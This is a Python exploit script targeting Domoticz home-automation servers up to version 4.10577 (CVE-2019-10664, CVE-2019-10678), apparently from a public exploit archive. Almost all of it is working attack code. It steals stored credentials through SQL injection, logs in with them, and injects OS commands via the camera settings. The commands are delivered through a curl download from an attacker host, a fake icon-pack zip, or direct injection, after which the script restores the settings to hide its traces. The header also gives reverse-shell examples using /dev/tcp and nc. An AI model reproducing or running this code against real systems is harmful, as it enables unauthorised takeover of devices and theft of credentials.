#-*- coding: utf-8 -*-
# Exploit Title: Unauthenticated Remote Command Execution on Domoticz <= 4.10577
# Exploit Author: Fabio Carretto @ Certimeter Group
# Vendor Homepage: https://www.domoticz.com/
# Software Link: https://www.domoticz.com/downloads/
# Version: Domoticz <= 4.10577
# Tested on: Debian 9
# CVE: CVE-2019-10664, CVE-2019-10678
# ====================================================================
# Bypass authentication, inject commands and execute them
# Required login page or no authentication (doesn&#039;t work with "Basic-Auth" setting)
# There are 3 injection modes. The 1st and the 2nd bypass the char filter:
# 1.Default mode insert the commands in a script and reply with it once to
#   an HTTP request. Set address and port of the attacker host with -H and -P
# 2.(-zipcmd) a zip icon pack will be uploaded. The domoticz installation path
#   can be optionally specified with -path /opt/domoti..
# 3.(-direct) commands executed directly. Characters like & pipe or redirection
#   cannot be used. The execution may block domoticz web server until the end
# Examples:
# ./exploit.py -H 172.17.0.1 -P 2222 http://172.17.0.2:8080/ &#039;bash -i >& /dev/tcp/172.17.0.1/4444 0>&1 &&#039;
# ./exploit.py -zipcmd http://localhost:8080/ &#039;nc 10.0.2.2 4444 -e /bin/bash &&#039;

import argparse
import requests
import urllib
import base64
import json
import BaseHTTPServer
import zipfile
import thread

# Retrieve data from db with the SQL Injection on the public route
def steal_dbdata(field):
    urltmp = url_sqlinj + sqlinj
    r = session.get(urltmp)
    print &#039;[+] %s: %s&#039; % (field,r.text)
    return r.text

# Login and return the SID cookie
def dologin(username, password):
    url_login_cred = url_login % (username, password)
    r = session.get(url_login_cred)
    sid = r.headers[&#039;Set-Cookie&#039;]
    sid = sid[sid.find(&#039;SID=&#039;)+4 : sid.find(&#039;;&#039;)]
    print &#039;[+] SID=&#039; + sid
    return sid

# Search an uvc cam. If exists return its json config
def get_uvc_cam():
    r = session.get(url_camjson)
    cams = json.loads(r.text)
    if cams[&#039;status&#039;] == &#039;OK&#039; and &#039;result&#039; in cams:
        for cam in cams[&#039;result&#039;]:
            if cam[&#039;ImageURL&#039;]==&#039;uvccapture.cgi&#039;:
                return cam
    return None

# Prompt the user and ask if continue or not
def prompt_msg(msg):
    print &#039;[+] WARNING: &#039; + msg
    if not args.f and not raw_input(&#039;[+] Continue? [y/N]: &#039;) in ["y","Y"]:
        exit(0)
    return None

# Embed the commands in a zip icon file (-zipcmd)
def create_zip(commandsline):
    zipname = &#039;iconpackfake.zip&#039;
    with zipfile.ZipFile(zipname, &#039;w&#039;) as zip:
        zip.writestr(&#039;icons.txt&#039;, "fakeicon;Button fakeicon;fake")
        zip.writestr(&#039;fakeicon.png&#039;, commandsline)
        zip.writestr(&#039;fakeicon48_On.png&#039;, commandsline)
        zip.writestr(&#039;fakeicon48_Off.png&#039;, commandsline)
    return zipname

# HTTP server that reply once with the content of the script
class SingleHandler(BaseHTTPServer.BaseHTTPRequestHandler):
    respbody = ""
    def do_GET(self):
        self.send_response(200)
        self.send_header(&#039;Content-type&#039;, &#039;text/html&#039;)
        self.end_headers()
        self.wfile.write(self.respbody)
        return None
    def log_request(self, code):
        pass

#--------------------------------------------------------------------
# INITIALIZATION
#--------------------------------------------------------------------
parser = argparse.ArgumentParser(
    description="""Unauthenticated Remote Command Execution on Domoticz!
    (version <= 4.10577) Bypass authentication, inject os commands and execute them!""",
    epilog="""The default mode (1) insert the commands in a script and reply 
    with it once to an HTTP request, use -H address and -P port.
    The -zipcmd (2) or -direct (3) option override the default mode.""")
parser.add_argument(&#039;-noexec&#039;, action=&#039;store_true&#039;, help=&#039;no cmd injection, just steal credentials&#039;)
parser.add_argument(&#039;-zipcmd&#039;, action=&#039;store_true&#039;, help=&#039;upload a zip icon pack with commands inside (2)&#039;)
parser.add_argument(&#039;-direct&#039;, action=&#039;store_true&#039;, help=&#039;inject commands directly in uvc params (3)&#039;)
parser.add_argument(&#039;-H&#039;, dest=&#039;lhost&#039;, type=str, help=&#039;address/name of attacker host in default mode (1)&#039;)
parser.add_argument(&#039;-P&#039;, dest=&#039;lport&#039;, type=int, help=&#039;tcp port of attacker host in default mode (1)&#039;)
parser.add_argument(&#039;-path&#039;, dest=&#039;path&#039;, type=str, default=&#039;/src/domoticz&#039;,
    help=&#039;change root path of domoticz to find the uploaded icon(script). Useful only with -zipcmd option&#039;)
parser.add_argument(&#039;-f&#039;, action=&#039;store_true&#039;, help=&#039;shut up and do it&#039;)
parser.add_argument(&#039;url&#039;, metavar=&#039;URL&#039;, nargs=1, type=str, help=&#039;target URL e.g.: http://localhost:8080/&#039;)
parser.add_argument(&#039;cmd&#039;, metavar=&#039;cmd&#039;, nargs=&#039;+&#039;, type=str, help=&#039;os command to execute, &#039;
    &#039;send it in background or do a short job, the domoticz web server will hang during execution&#039;)
args  = parser.parse_args()
if not(args.direct or args.zipcmd) and (args.lhost is None or args.lport is None):
    print &#039;[-] Default mode needs host (-H) and port (-P) of attacker to download the commands&#039;
    exit(0)
username = &#039;&#039;
password = &#039;&#039;
cookies = dict()
noauth  = True
cmd = args.cmd
url = args.url[0][:-1] if args.url[0][-1]==&#039;/&#039; else args.url[0]
url_sqlinj  = url + &#039;/images/floorplans/plan?idx=1 &#039;
url_login   = url + &#039;/json.htm?type=command&param=logincheck&username=%s&password=%s&rememberme=true&#039;
url_getconf = url + &#039;/json.htm?type=settings&#039;
url_setconf = url + &#039;/storesettings.webem&#039;
url_iconupl = url + &#039;/uploadcustomicon&#039;
url_camjson = url + &#039;/json.htm?type=cameras&#039;
url_camlive = url + &#039;/camsnapshot.jpg?idx=&#039;
url_camadd  = url + &#039;/json.htm?type=command&param=addcamera&address=127.0.0.1&port=8080&#039; \
    &#039;&name=uvccam&enabled=true&username=&password=&imageurl=dXZjY2FwdHVyZS5jZ2k%3D&protocol=0&#039;
cmd_zipicon = [&#039;chmod 777 %s/www/images/fakeicon48_On.png&#039; % args.path,
    &#039;%s/www/images/fakeicon48_On.png&#039; % args.path]
cmd_default = [&#039;curl %s -o /tmp/myexec.sh -m 5&#039;, &#039;chmod 777 /tmp/myexec.sh&#039;, &#039;/tmp/myexec.sh&#039;]

#--------------------------------------------------------------------
# AUTHENTICATION BYPASS
#--------------------------------------------------------------------
session = requests.Session()
r = session.get(url_getconf)
if r.status_code == 401:
    noauth = False
    username = steal_dbdata(&#039;WebUserName&#039;)
    password = steal_dbdata(&#039;WebPassword&#039;)
    cookies[&#039;SID&#039;] = dologin(username, password)
    r = session.get(url_getconf)
if args.noexec is True:
    exit(0)
settings = json.loads(r.text)
settings.pop(&#039;UVCParams&#039;, None)
#--------------------------------------------------------------------
# Fix necessary to not break or lose settings
chn = {&#039;WebTheme&#039;:&#039;Themes&#039;,&#039;UseAutoBackup&#039;:&#039;enableautobackup&#039;,&#039;UseAutoUpdate&#039;:&#039;checkforupdates&#039;}
for k in chn:
    settings[chn[k]] = settings.pop(k, None)
sub = settings.pop(&#039;MyDomoticzSubsystems&#039;, 0)
if sub >= 4:
    settings[&#039;SubsystemApps&#039;] = 4; sub -= 4
if sub >= 2:
    settings[&#039;SubsystemShared&#039;] = 2; sub -= 2
if sub == 1:
    settings[&#039;SubsystemHttp&#039;] = 1  
try:    
    settings[&#039;HTTPURL&#039;] = base64.b64decode(settings[&#039;HTTPURL&#039;])
    settings[&#039;HTTPPostContentType&#039;] = base64.b64decode(settings[&#039;HTTPPostContentType&#039;])
    settings[&#039;Latitude&#039;] = settings[&#039;Location&#039;][&#039;Latitude&#039;]
    settings[&#039;Longitude&#039;] = settings[&#039;Location&#039;][&#039;Longitude&#039;]
    settings.pop(&#039;Location&#039;, None)
except:
    pass
toOn  = [&#039;allow&#039;,&#039;accept&#039;,&#039;hide&#039;,&#039;enable&#039;,&#039;disable&#039;,&#039;trigger&#039;,&#039;animate&#039;,&#039;show&#039;]
toOn += [&#039;usee&#039;,&#039;floorplanfullscreen&#039;,&#039;senderrorsasn&#039;,&#039;emailasa&#039;,&#039;checkforupdates&#039;]
for k in [x for x in settings if any([y for y in toOn if y in x.lower()])]:
    if(str(settings[k]) == &#039;1&#039;):
        settings[k] = &#039;on&#039;
    elif(str(settings[k]) == &#039;0&#039;):
        settings.pop(k, None)

#--------------------------------------------------------------------
# COMMAND INJECTION
#--------------------------------------------------------------------
cmdwrap = &#039;\n&#039;.join([&#039;#!/bin/bash&#039;] + cmd)
payload = urllib.urlencode(settings) + &#039;&&#039;
if cmd[-1][-1] != &#039;&&#039; and not args.direct:
    prompt_msg(&#039;if not sent in background the commands may block domoticz&#039;)
if args.direct:
    prompt_msg(&#039;in direct mode & pipe redirect are not allowed (may block domoticz)&#039;)
elif args.zipcmd:
    fakezip = create_zip(cmdwrap)
    files = [(&#039;file&#039;,(fakezip, open(fakezip,&#039;rb&#039;), &#039;application/zip&#039;))]
    r = session.post(url_iconupl, files=files)
    cmd = cmd_zipicon
else:
    httpd = BaseHTTPServer.HTTPServer(("", args.lport), SingleHandler)
    SingleHandler.respbody = cmdwrap
    thread.start_new_thread(httpd.handle_request, ())
    cmd_default[0] = cmd_default[0] % (&#039;http://%s:%d/&#039; % (args.lhost,args.lport))
    cmd = cmd_default
# Encode the space and send the others in clear (chars like <>&;| not allowed)
cmdencode = &#039;\n&#039;.join([x.replace(&#039; &#039;, &#039;+&#039;) for x in cmd])
payload += &#039;UVCParams=-d+/dev/aaa\n%s\n#&#039; % (cmdencode)
req = requests.Request(&#039;POST&#039;, url_setconf, data=payload, cookies=cookies)
print &#039;[+] Commands successfully injected&#039;

#--------------------------------------------------------------------
# COMMAND EXECUTION
#--------------------------------------------------------------------
if noauth:
    session.cookies.clear() # fix if authentication is disabled
cam = get_uvc_cam()
if cam is None:
    print &#039;[+] Adding new UVC camera&#039;
    r = session.get(url_camadd)
    cam = get_uvc_cam()
print &#039;[+] Execution on cam with idx: &#039; + str(cam[&#039;idx&#039;])
r = session.get(url_camlive + str(cam[&#039;idx&#039;]))
# Restore the default UVC parameters (like a ninja)
settings[&#039;UVCParams&#039;] = &#039;-S80 -B128 -C128 -G80 -x800 -y600 -q100&#039;
session.post(url_setconf, data=settings)
print &#039;[+] Done! Restored default uvc params!&#039;

